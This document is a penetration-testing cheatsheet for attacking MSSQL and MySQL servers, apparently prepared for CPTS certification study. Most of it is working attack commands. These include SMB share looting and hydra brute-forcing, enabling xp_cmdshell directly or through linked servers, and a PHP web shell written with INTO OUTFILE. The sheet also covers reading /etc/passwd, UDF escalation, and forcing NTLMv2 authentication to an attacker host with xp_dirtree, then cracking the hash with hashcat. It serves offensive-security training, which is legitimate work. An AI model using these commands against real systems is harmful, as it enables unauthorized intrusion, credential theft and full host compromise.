# Attacking SQL Databases — CPTS Cheatsheet

## 1. Quick Reference

| Service       | Default Port | Notes                              |
| ------------- | ------------ | ----------------------------------- |
| MSSQL         | `TCP/1433`   | Microsoft SQL Server                |
| MSSQL Browser | `UDP/1434`   | SQL Server instance discovery       |
| MSSQL hidden  | `TCP/2433`   | Possible alternate/hidden port      |
| MySQL         | `TCP/3306`   | MySQL/MariaDB                       |

**Main goals after gaining DB access:**

1. Enumerate databases
2. Enumerate tables
3. Find interesting data/credentials
4. Determine privileges (`SYSTEM_USER`, `sysadmin`)
5. Check command execution (`xp_cmdshell`)
6. Check file read/write
7. Check MSSQL impersonation (`IMPERSONATE`)
8. Check linked servers
9. Consider NTLM hash capture (`xp_dirtree`)
10. Pivot creds found elsewhere (SMB, files) back into SQL logins

---

## 2. Enumeration

### Nmap — MSSQL

```
nmap -Pn -sV -sC -p1433 <TARGET>
```

Look for: SQL Server version, hostname, domain, SQL instance info, NTLM info, TLS/SSL info.

```
| ms-sql-info:
|     Version: Microsoft SQL Server 2019 RTM
| ms-sql-ntlm-info:
|     Target_Name / NetBIOS_Domain_Name / DNS_Computer_Name
```

`ms-sql-ntlm-info` alone can hand you the hostname/domain without any credentials — useful for building `DOMAIN\user` / `.\user` login strings later.

### Broader SQL port scan

```
nmap -Pn -sV -p1433,1434,2433,3306 <TARGET>
```

### Full TCP sweep first (don't rely on top-1000)

Real CPTS boxes often hide MSSQL/SMB/RDP together — always do a full port scan before assuming SQL is the only service:

```
nmap -p- --min-rate=10000 <TARGET>
nmap -Pn -sV -sC -p<found_ports> <TARGET>
```

### SMB alongside SQL

MSSQL boxes are frequently domain-joined Windows hosts with SMB open too. Always check for a null-session share first — creds for SQL logins are often just sitting in a share:

```
smbclient -N -L //<TARGET>
smbclient -N //<TARGET>/<SHARE>
```

Inside the share:

```
recurse ON
mget *
```

Grep downloaded files for creds:

```
grep -ri "pass" -r .
```

---

## 3. MSSQL Authentication

### SQL Authentication

Username/password stored inside SQL Server itself.

```
username + password
```

### Windows Authentication

Uses Windows/Active Directory credentials.

```
DOMAIN\username
SERVER\username
.\username
```

**Key distinction:**

```
SQL Authentication  → SQL Server-local account
Windows Auth        → Windows/AD account (domain trust)
```

---

## 4. Connect to MySQL

```
mysql -u <USER> -p<PASSWORD> -h <TARGET>
mysql -u <USER> -p<PASSWORD> -h <TARGET> --skip-ssl
```

Example:

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

**Tip:** `-p` directly followed by the password works, but interactive password entry is generally safer (avoids it landing in shell history / `ps`).

---

## 5. Connect to MSSQL

### Windows / SQLCMD

```
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>'
```

Better output:

```
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>' -y 30 -Y 30
```

### Linux — sqsh

```
sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

Windows/local account:

```
sqsh -S <TARGET> -U .\\<USER> -P '<PASSWORD>' -h
```

### Impacket (preferred on Linux)

**SQL authentication:**

```
impacket-mssqlclient <USER>@<TARGET> -p 1433
```

**Windows authentication** (`DOMAIN\user` or local `SERVER\user` creds — this is the common case on CPTS boxes):

```
impacket-mssqlclient <USER>@<TARGET> -windows-auth
```

You'll be prompted for the password interactively (or pass `-p '<PASSWORD>'`, avoid when possible). Note the resulting prompt tells you both the login *and* the effective DB user:

```
SQL (WIN-HARD\Fiona  guest@master)>
```

**Extra shell commands inside impacket-mssqlclient** (type `help`):

```
enable_xp_cmdshell     # auto-runs the sp_configure dance for you
disable_xp_cmdshell
xp_cmdshell <cmd>       # shortcut, no need to type EXEC manually
```

---

## 6. MySQL Database Enumeration

```
SHOW DATABASES;
USE <DATABASE>;
SHOW TABLES;
SELECT * FROM <TABLE>;
```

Workflow:

```
SHOW DATABASES → USE database → SHOW TABLES → SELECT * FROM interesting_table
```

---

## 7. MSSQL Database Enumeration

### Show databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
-- or
SELECT name FROM sys.databases
GO
```

### Select database

```sql
USE <DATABASE>
GO
```

### Show tables

```sql
SELECT table_name
FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
GO
-- fully qualified, works without USE:
SELECT * FROM flagDB.INFORMATION_SCHEMA.TABLES
```

### Read table

```sql
SELECT * FROM <TABLE>
GO
```

**Important:** `sqlcmd`/`sqsh` batches require a `GO` on its own line to actually execute. `impacket-mssqlclient` does **not** need `GO` — it executes each line as you send it.

---

## 8. Important Default Databases

### MySQL

```
mysql
information_schema
performance_schema
sys
```

### MSSQL

```
master
msdb
model
resource
tempdb
```

**Most useful for enumeration:** MySQL → `information_schema`; MSSQL → `master`.

---

## 9. MSSQL — Check Current User / Privileges

```sql
SELECT SYSTEM_USER
GO
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Result: `0` = not sysadmin, `1` = sysadmin.

This is one of the **first checks** after any successful login — do it for every user you pivot to, since privileges differ per login even on the same server.

---

## 10. MSSQL — xp_cmdshell

`xp_cmdshell` executes OS commands through SQL Server, running as the **SQL Server service account**.

### Check / execute

```sql
EXEC xp_cmdshell 'whoami'
GO
```

### Enable xp_cmdshell (if disabled and you have sysadmin/ALTER SETTINGS)

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

In impacket, the shortcut is just:

```
enable_xp_cmdshell
```

### Key idea

```
SQL privileges → xp_cmdshell → Windows command execution
                              → runs as SQL Server service account
```

---

## 11. MySQL — Write Local Files

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```

Requires the `FILE` privilege.

### Check secure_file_priv

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

```
empty   → no directory restriction
/path   → file operations restricted to that directory
NULL    → file import/export disabled entirely
```

**Attack condition:** `FILE` privilege + permitted output directory + web-accessible location = DB access → web shell → RCE.

### MySQL — UDF privilege escalation (Linux/Windows MySQL, sysadmin-equivalent)

If you have `FILE` + write access to the plugin directory, a User Defined Function can give command execution similar to `xp_cmdshell`:

```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- write lib_mysqludf_sys (or similar) .so/.dll to plugin_dir via INTO DUMPFILE
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('whoami');
```

Note: requires an actual UDF binary matching the target OS/arch — treat as a known technique to recognize, not something to blindly copy-paste.

---

## 12. MSSQL — Read Local Files

```sql
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents
GO
```

Concept: `SQL Server → OPENROWSET(BULK ...) → OS file → file contents`. Requires the account to have filesystem read access to that path.

---

## 13. MySQL — Read Local Files

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Requires `FILE` privilege and the file to be world-readable / accessible to the mysql process, plus `secure_file_priv` not blocking it.

---

## 14. MSSQL — Capture Service Account NTLMv2 Hash

A very important attack chain — even a low-privilege SQL login can usually trigger this:

```
xp_dirtree / xp_subdirs → SMB connection to attacker
  → MSSQL service account authenticates
  → NTLMv2 challenge/response captured
  → Crack or relay
```

### Using xp_dirtree

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

### Using xp_subdirs

```sql
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

### Listener — Responder

```
sudo responder -I <INTERFACE>
```

Watch for a line like:

```
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:...
```

### Alternative — Impacket SMB server

```
sudo impacket-smbserver share ./ -smb2support
```

Then trigger `xp_dirtree` at that share as above.

### Cracking the captured hash

```
echo '<CAPTURED_NTLMv2_HASH_LINE>' > hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

`-m 5600` = NetNTLMv2. Once cracked, log back in with `impacket-mssqlclient <SERVICE_ACCOUNT>@<TARGET> -windows-auth` — this is a direct path from "no creds" → "service-account SQL login."

**Do this early** on any MSSQL box, even with a low-priv login — `xp_dirtree` almost never requires elevated rights and is one of the highest-value, lowest-effort moves in MSSQL enumeration.

---

## 15. MSSQL — Impersonation

`IMPERSONATE` lets one SQL login operate as another login (potentially `sa`/sysadmin) without knowing its password.

### Find who can impersonate whom

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

This lists the **grantors** — i.e. users whose identity can be impersonated by someone. It does not by itself tell you *which* login holds the permission; if you land as one of the users returned here, or as a login you suspect has `IMPERSONATE`, check directly:

```sql
SELECT SYSTEM_USER
GO
```

### Impersonate

```sql
EXECUTE AS LOGIN = 'sa'
GO
```

Verify:

```sql
SELECT SYSTEM_USER
GO
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

### Revert

```sql
REVERT
GO
```

### Chained impersonation (real-world pattern)

Impersonation rights are often chained across multiple non-sysadmin users rather than granting `sa` directly — e.g. `fiona` can impersonate `john`, and `john` (still not sysadmin himself) is the one with the real path forward (a linked server). Walk the chain:

```sql
-- as fiona
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
-- returns: john, simon

EXECUTE AS LOGIN = 'john'
GO
SELECT SYSTEM_USER          -- confirms we're now john
SELECT IS_SRVROLEMEMBER('sysadmin')   -- still 0, but john has a linked server available
```

**Attack chain:**

```
Low-privileged SQL user
   → IMPERSONATE permission
   → Impersonate another (possibly still non-sysadmin) login
   → That login has its own separate path (linked server, different DB rights, etc.)
   → Full compromise
```

Don't stop at "impersonation target isn't sysadmin either" — check what *that* user can reach.

**Note:** switch to `master` first if the impersonation-permission query returns nothing (`USE master; GO`).

---

## 16. MSSQL — Linked Servers

A linked server lets one SQL Server execute queries against another SQL Server/database system, often with **different, higher-privileged credentials** stored on the link itself — this is a classic privilege-escalation and lateral-movement vector, including link-backs to `localhost` under different service-account context.

### Enumerate linked servers

```sql
SELECT srvname, isremote FROM sysservers
GO
```

```
srvname                 isremote
---------------------   --------
WINSRV02\SQLEXPRESS     1
LOCAL.TEST.LINKED.SRV   0
```

`isremote = 0` linked servers pointing back at the *local* instance are especially valuable — the linked-server login context is frequently `sa`/sysadmin even when your own login isn't.

### Run an arbitrary query through the link

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO
```

Quotes inside the remote query string must be doubled (`''`) since it's a string literal.

### Enable xp_cmdshell ON the linked server (privesc even if your own login can't)

If the linked-server credentials are sysadmin, you can flip `xp_cmdshell` remotely — even though your *own* login has no such rights:

```sql
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
GO
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
EXEC ('sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV]
GO
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

### Execute commands through the link

```sql
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

If the linked-server account is `nt authority\system`, you effectively have full admin:

```sql
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

### Attack chain

```
Current SQL Server (low priv)
   → Linked Server (0-isremote = points back to itself, or to another host)
   → Different, often higher-privileged credentials
   → Enable xp_cmdshell remotely
   → OS command execution as SYSTEM / sysadmin
```

This is frequently the **actual sysadmin path** on a box where your direct login never becomes sysadmin at all — don't assume "not sysadmin" is a dead end before checking linked servers.

---

## 17. Credential Discovery / Brute-Forcing Feeding Into SQL

Real assessments rarely start with valid SQL creds handed to you — build them up:

### Brute-force a known username against a wordlist of candidate passwords

```
hydra -l <USER> -P <PASSWORDS_FILE> rdp://<TARGET>
hydra -l <USER> -P <PASSWORDS_FILE> mssql://<TARGET>
```

`hydra` against `rdp://` can report a password as valid even when the RDP connection itself fails (account not enabled for remote desktop) — always retry the reported creds directly against MSSQL/SMB, they may still be correct there.

### Creds harvested from SMB shares are gold for SQL logins

Files like `creds.txt` sitting in a user's home share are commonly the actual password (or the password list to brute-force with) for that same user's Windows-auth SQL login:

```
impacket-mssqlclient <found_user>@<TARGET> -windows-auth
```

### General credential-hunting mindset for SQL boxes

```
SMB null session / share creds
        ↓
Windows-auth login to MSSQL
        ↓
Enumerate DBs / tables for more creds
        ↓
IMPERSONATE / linked servers for privesc
        ↓
xp_cmdshell → SYSTEM
        ↓
Dump SAM/NTDS, read flags, pivot further
```

---

## 18. MySQL Authentication Vulnerability — CVE-2012-2122

Historical vulnerability affecting certain MySQL/MariaDB versions where repeated incorrect authentication attempts can, due to a type-comparison bug, occasionally result in successful authentication bypass. **Version-specific** — check the target version before assuming it applies; not a generic MySQL technique.

---

## 19. xp_dirtree Forced Authentication (Not a Traditional CVE)

The weakness comes from the interaction of MSSQL + `xp_dirtree`/`xp_subdirs` + SMB authentication, not a patchable code bug:

```
Attacker-controlled UNC path → xp_dirtree() → MSSQL attempts SMB access
   → Windows automatically authenticates → NTLMv2 response sent → captured
   → Crack / Relay
```

The critical concept is **forced authentication**, not code execution — this works even against fully-patched SQL Server.

---

## 20. High-Value MSSQL Checklist

```
[ ] Version / hostname / domain (nmap ms-sql-info, ms-sql-ntlm-info — no creds needed)
[ ] SMB null session / shares for stray creds
[ ] SQL auth or Windows auth login
[ ] Current user (SYSTEM_USER)
[ ] sysadmin? (IS_SRVROLEMEMBER)
[ ] Databases → tables → interesting data/creds
[ ] IMPERSONATE — who can impersonate whom, walk the chain
[ ] Linked servers (sysservers) — especially isremote = 0
[ ] xp_cmdshell (direct, or via AT [linked_server])
[ ] File read (OPENROWSET)
[ ] xp_dirtree / xp_subdirs → Responder → crack/relay
[ ] Re-check privileges after every pivot (each login differs)
```

## 21. MySQL High-Value Checklist

```
[ ] Version / auth method
[ ] Databases → tables → interesting data
[ ] FILE privilege
[ ] secure_file_priv value
[ ] LOAD_FILE() — read
[ ] SELECT ... INTO OUTFILE — write
[ ] plugin_dir writable? → UDF → command execution
[ ] CVE-2012-2122 applicable to this version?
```

---

## 22. CPTS SQL Attack Workflow

```
                        SQL SERVICE
                             │
                 ┌───────────┴───────────┐
                 ↓                       ↓
               MSSQL                    MySQL
                 │                       │
      nmap version/NTLM info      nmap version
      SMB share creds check       Authenticate
                 │                       │
           Authenticate            Enumerate DBs
                 │                       │
           Enumerate DBs/tables    Enumerate tables
                 │                       │
          Check privileges         Find sensitive data
                 │                       │
     ┌───────────┼────────────┐    Check FILE / secure_file_priv
     ↓           ↓             ↓         │
xp_cmdshell  IMPERSONATE   Linked   ┌─────┴─────┐
     │        (chain)      Servers  ↓           ↓
     │            │            │  LOAD_FILE  INTO OUTFILE /
     │            ↓            ↓  (read)      UDF (write→RCE)
     │        sysadmin?   enable xp_cmdshell
     │            │        remotely (AT [...])
     └────────────┴────────────┘
                  ↓
         OS Command Execution (SYSTEM)
                  ↓
            xp_dirtree
                  ↓
         SMB forced authentication
                  ↓
            NTLMv2 Hash
             ↙       ↘
          Crack      Relay
```

---

## 23. Must-Remember Commands

### Enumeration

```
nmap -Pn -sV -sC -p1433,1434,2433,3306 <TARGET>
```

### MySQL

```
mysql -u <USER> -p<PASSWORD> -h <TARGET>
SHOW DATABASES; USE <DB>; SHOW TABLES; SELECT * FROM <TABLE>;
```

### MSSQL

```
impacket-mssqlclient <USER>@<TARGET>              # SQL auth
impacket-mssqlclient <USER>@<TARGET> -windows-auth # Windows auth
SELECT name FROM master.dbo.sysdatabases
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

### Command execution

```
EXEC xp_cmdshell 'whoami'
enable_xp_cmdshell        -- impacket shortcut
```

### File read

```
SELECT * FROM OPENROWSET(BULK N'C:/path/file', SINGLE_CLOB) AS Contents
SELECT LOAD_FILE('/etc/passwd');
```

### Forced authentication

```
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
sudo responder -I <INTERFACE>
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

### Impersonation

```
EXECUTE AS LOGIN = 'sa'
REVERT
```

### Linked server (enum + escalate + execute)

```
SELECT srvname, isremote FROM sysservers
EXEC ('sp_configure ''xp_cmdshell'', 1') AT [<LINKED_SERVER>]
EXEC ('RECONFIGURE') AT [<LINKED_SERVER>]
EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]
```

### Credential pivoting

```
smbclient -N -L //<TARGET>
hydra -l <USER> -P <PASSWORDS_FILE> rdp://<TARGET>
```

---

## 24. Core Things to Remember

- **1433 = MSSQL**, **3306 = MySQL**, **1434/UDP = MSSQL browser discovery**.
- `GO` is required for `sqlcmd`/`sqsh` batches — **not** for `impacket-mssqlclient`.
- Always check **who you are and your privileges** — after every login *and* after every impersonation/pivot.
- MSSQL's `xp_cmdshell` can turn SQL access into OS command execution as the service account.
- `xp_dirtree`/`xp_subdirs` cost nothing to try and rarely require special privileges — try them early on every MSSQL box.
- `IMPERSONATE` chains can go through multiple non-sysadmin users before reaching the real path — don't stop at the first impersonation target.
- **Linked servers with `isremote = 0`** frequently carry higher-privileged credentials than your own login and can enable `xp_cmdshell` even when your direct login can't.
- MySQL `LOAD_FILE()` reads, `SELECT ... INTO OUTFILE` writes — both gated by `FILE` privilege and `secure_file_priv`.
- A writable MySQL `plugin_dir` + `FILE` privilege can escalate to command execution via UDFs.
- SMB shares on the same box are a common source of the actual SQL login password — always check null-session shares before brute-forcing.
- Database access does **not automatically mean sysadmin/root** — privileges determine what you can actually do, and different logins on the same server can have wildly different rights.
- Mental model:

```
Recon → Credential discovery (SMB/brute) → Authenticate → Enumerate
  → Privileges → Impersonate/Link-pivot → Command Execution → NTLM capture/crack/relay
```
